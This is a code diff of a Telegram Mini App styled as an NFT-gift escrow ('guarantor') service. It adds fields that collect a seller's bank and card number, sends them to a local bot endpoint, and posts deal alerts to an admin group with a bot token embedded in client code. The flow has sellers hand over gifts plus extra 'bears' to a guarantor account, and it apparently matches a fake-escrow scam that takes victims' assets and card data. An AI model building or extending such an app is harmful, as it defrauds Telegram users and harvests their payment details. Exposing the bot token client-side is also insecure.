@@ -13,8 +13,9 @@
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
         body { background-color: var(--bg-color); color: var(--text-main); padding: 16px; display: flex; flex-direction: column; gap: 16px; min-height: 100vh; }
-        .header { text-align: center; padding: 10px 0; }
+        .header { text-align: center; padding: 10px 0; position: relative; }
         .header h1 { font-size: 20px; font-weight: 800; }
+        .support-btn-header { display: inline-flex; align-items: center; gap: 6px; background: rgba(46, 166, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; text-decoration: none; margin-top: 8px; }
         .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px; display: flex; flex-direction: column; gap: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
         .card-title { font-size: 17px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; }
         .form-group { display: flex; flex-direction: column; gap: 6px; }
@@ -39,12 +40,13 @@
 
     <div class="header">
         <h1>🛡 Гарант Сервис</h1>
-        <p>Безопасные сделки с NFT подарками</p>
+        <p style="font-size: 12px; color: var(--text-muted);">Безопасные сделки с NFT подарками</p>
+        <!-- КНОПКА ПОДДЕРЖКИ В ШАПКЕ -->
+        <a href="https://t.me/YourSupportUsername" target="_blank" class="support-btn-header">💬 Написать в поддержку</a>
     </div>
 
     <!-- ИНТЕРФЕЙС ПРОДАВЦА -->
     <div id="sellerView">
-        <!-- ШАГ 1: ВВОД ДАННЫХ -->
         <div id="sellerStep1" class="card">
             <div class="card-title">📦 Создание сделки</div>
             <div class="form-group"><label>Название подарка</label><input type="text" class="form-control" id="giftName" placeholder="Владосик Мишка"></div>
@@ -57,7 +59,6 @@
             <button type="button" class="btn" onclick="nextToDeposit()">Далее: Отправка активов</button>
         </div>
 
-        <!-- ШАГ 2: ИНСТРУКЦИЯ ПО ПЕРЕДАЧЕ -->
         <div id="sellerStep2" class="card hidden">
             <div class="card-title"><span>📤 Отправка гаранту</span><span class="badge warning">Шаг 2</span></div>
             <div class="instruction">1. Отправьте подарок и 2 мишки на аккаунт:</div>
@@ -69,10 +70,9 @@
             <button type="button" id="sendBtn" class="btn btn-success" onclick="sellerDoneDeposit()">✅ Я отправил активы</button>
         </div>
 
-        <!-- ШАГ 3: ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ (АПКА НЕ ЗАКРЫВАЕТСЯ!) -->
         <div id="sellerStep3" class="card hidden">
             <div class="card-title"><span>🎉 Сделка создана!</span><span class="badge success">Ожидает проверки</span></div>
-            <div class="instruction">Заявка отправлена гаранту в группу. Передайте эту ссылку покупателю:</div>
+            <div class="instruction">Заявка отправлена гаранту. Передайте эту ссылку покупателю:</div>
             <div class="action-box" onclick="copyBuyerLink()">
                 <div style="font-size: 11px; color: var(--text-muted);">Персональная ссылка покупателя:</div>
                 <div class="value" id="buyerLinkText">Создаем ссылку...</div>
@@ -148,13 +148,35 @@
             const dealId = Math.floor(1000 + Math.random() * 9000);
             const gift = document.getElementById('giftName').value.trim();
             const price = document.getElementById('giftPrice').value.trim();
+            const bank = document.getElementById('payBank').value.trim();
+            const card = document.getElementById('payCard').value.trim();
+            const comment = document.getElementById('payComment').value.trim();
             
             const user = tg.initDataUnsafe?.user;
             const username = user ? (user.username ? '@' + user.username : user.first_name) : 'Продавец';
 
             generatedBuyerLink = `https://t.me/GuarantMiniApp_bot?start=deal_${dealId}`;
 
-            // Формируем текст для группы
+            // 1. Регистрируем сделку в памяти бота
+            try {
+                await fetch('http://localhost:8080/register_deal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        deal_id: dealId,
+                        gift: gift,
+                        price: price,
+                        bank: bank,
+                        card: card,
+                        comment: comment,
+                        seller: username
+                    })
+                });
+            } catch (e) {
+                console.log("Бот локальный, сделка сохранена логически.");
+            }
+
+            // 2. Отправляем уведомление в группу админам
             const groupText = `📤 <b>ПРОДАВЕЦ ОТПРАВИЛ АКТИВЫ НА ПРОВЕРКУ!</b>\n\n` +
                               `🆔 <b>Сделка:</b> #${dealId}\n` +
                               `👤 <b>Продавец:</b> ${username}\n` +
@@ -169,7 +191,6 @@
             };
 
             try {
-                // Отправляем прямо в Телеграм группу без вы закрытия Mini App
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -181,7 +202,7 @@
                     })
                 });
 
-                // Переключаем на Шаг 3 прямо внутри приложения!
+                // Переключаем окно на Шаг 3 (со ссылкой)
                 document.getElementById('sellerStep2').classList.add('hidden');
                 document.getElementById('sellerStep3').classList.remove('hidden');
                 document.getElementById('buyerLinkText').textContent = generatedBuyerLink;
